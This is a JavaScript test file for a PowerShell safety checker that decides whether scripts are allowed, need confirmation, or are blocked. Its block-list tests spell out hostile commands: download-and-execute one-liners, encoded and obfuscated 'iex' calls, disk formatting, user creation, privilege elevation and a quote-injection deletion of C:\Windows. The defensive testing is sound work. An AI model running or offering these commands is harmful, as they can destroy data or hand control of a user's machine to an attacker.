import test from 'node:test';
import assert from 'node:assert/strict';
import { checkScript, flatten, extractPaths, isInside } from './safety.js';

const HOME = 'C:\\Users\\me';
const opts = (over = {}) => ({ allowed: [`${HOME}\\Desktop`, `${HOME}\\Documents`, `${HOME}\\Downloads`], launchRoots: ['C:\\Program Files'], exists: () => true, env: { USERPROFILE: HOME }, ...over });
const level = (s, o) => checkScript(s, opts(o)).level;

test('safe scripts are ok', () => {
  assert.equal(level(`Get-ChildItem -LiteralPath '${HOME}\\Downloads'`), 'ok');
  assert.equal(level(`Start-Process 'C:\\Program Files\\VideoLAN\\VLC\\vlc.exe' -ArgumentList '${HOME}\\Downloads\\a.mp4'`), 'ok');
});
test('dangerous patterns are blocked', () => {
  for (const s of [
    'Invoke-Expression $x', 'iex (New-Object Net.WebClient).DownloadString("http://x")', 'powershell -enc AAAA', 'Format-Volume -DriveLetter D', 'format D:',
    'Stop-Computer -Force', 'Restart-Computer', 'shutdown /s', 'New-LocalUser -Name x', 'net user bob /add', 'Set-ItemProperty HKCU:\\Software\\x -Name a -Value 1',
    'reg add HKLM\\Software\\x', 'Clear-Disk -Number 1', 'diskpart', 'Start-Process cmd -Verb RunAs', '& $cmd', 'Set-ExecutionPolicy Unrestricted',
    "Invoke-WebRequest http://x/a.exe -OutFile a.exe; Start-Process a.exe",
  ]) assert.equal(level(s), 'block', s);
});
test('obfuscation is flattened before matching', () => {
  assert.equal(flatten("i`e`x 'a'+'b'"), "iex 'ab'");
  assert.equal(level("'i'+'ex' ; i`ex $a"), 'block');
  assert.equal(level('Invoke-`Expression $a'), 'block');
});
test('quote injection: curly quotes cannot smuggle a second command', () => {
  assert.equal(level(`Write-Output \u2018hi\u2019; Remove-Item C:\\Windows`), 'block');
});
test('deleting / overwriting / killing needs confirmation', () => {
  const del = checkScript(`Remove-Item -LiteralPath '${HOME}\\Downloads\\old.txt'`, opts());
  assert.equal(del.level, 'confirm');
  assert.ok(del.destructive);
  assert.equal(level(`Stop-Process -Name notepad`), 'confirm');
  assert.equal(level(`Invoke-WebRequest http://example.com/file.zip -OutFile '${HOME}\\Downloads\\f.zip'`, { exists: (p) => !p.endsWith('f.zip') }), 'confirm');
  assert.equal(level(`Set-Content -LiteralPath '${HOME}\\Desktop\\a.txt' -Value hi`), 'confirm');
});
test('deleting outside the allowed folders is blocked', () => {
  assert.equal(level(`Remove-Item -LiteralPath 'C:\\Windows\\System32\\x.dll'`), 'block');
  assert.equal(level(`Remove-Item -LiteralPath '${HOME}\\Downloads\\..\\..\\Windows\\x'`), 'block');
  assert.equal(level(`Set-Content -LiteralPath 'D:\\data\\a.txt' -Value hi`), 'block');
});
test('every path must exist (Test-Path rule); creating a file needs an existing folder', () => {
  const s = `Get-Content -LiteralPath '${HOME}\\Documents\\nope.txt'`;
  assert.equal(level(s, { exists: () => false }), 'block');
  const make = `New-Item -Path '${HOME}\\Desktop\\new.txt' -ItemType File`;
  assert.equal(level(make, { exists: (p) => !p.endsWith('new.txt') }), 'confirm');
  assert.equal(level(make, { exists: () => false }), 'block');
});
test('empty script is blocked; paths via $env: are resolved', () => {
  assert.equal(level('   '), 'block');
  assert.deepEqual(extractPaths('Get-Item $env:USERPROFILE\\Desktop', { USERPROFILE: HOME }), [`${HOME}\\Desktop`]);
});
test('isInside is case-insensitive and does not match sibling prefixes', () => {
  assert.ok(isInside('c:\\users\\ME\\desktop\\a', ['C:\\Users\\me\\Desktop']));
  assert.ok(!isInside('C:\\Users\\me\\Desktop2\\a', ['C:\\Users\\me\\Desktop']));
});
